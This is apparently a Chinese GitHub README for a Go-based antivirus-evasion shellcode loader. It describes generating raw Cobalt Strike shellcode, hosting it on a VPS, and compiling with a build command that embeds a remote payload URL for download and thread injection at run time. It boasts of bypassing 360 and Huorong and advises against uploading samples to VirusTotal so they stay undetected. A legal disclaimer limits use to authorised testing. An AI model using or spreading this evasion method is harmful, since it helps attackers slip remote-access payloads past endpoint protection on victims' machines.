# go加载器bypass
最近刚开始学习go语言写加载器，参考了几篇文章，利用线程注入和-race、载荷分离远程下载shellcode进行编译

1、首先用cs生成raw的shellcode上传到自己的vps服务器上

2、编译：go build -ldflags "-s -w -X main.url=http://xx.xx.xx.xx/payload.bin" -o 1.exe -race shellcode.go

3、VT查杀14，但是截止到目前为止，360与火绒都能bypass

![image](https://user-images.githubusercontent.com/84514302/129006676-eebc4fbc-2fda-45be-b0c7-c75b28177be8.png)
![image](https://user-images.githubusercontent.com/84514302/129006765-79440268-bd9e-4760-b029-fec262f3b260.png)

本人刚开始学习免杀，还很菜，此源码参考了https://github.com/fcre1938/goShellCodeByPassVT/blob/main/main.go

欢迎大佬提出建议

# 声明
依照《中华人民共和国网络安全法》等相关法规规定，任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。

本项目严禁用于非法网络入侵！仅限用于技术研究和获得正式授权的测试活动！

# 建议
建议大家实验中不要上传到virustotal、微步在线等检测网站
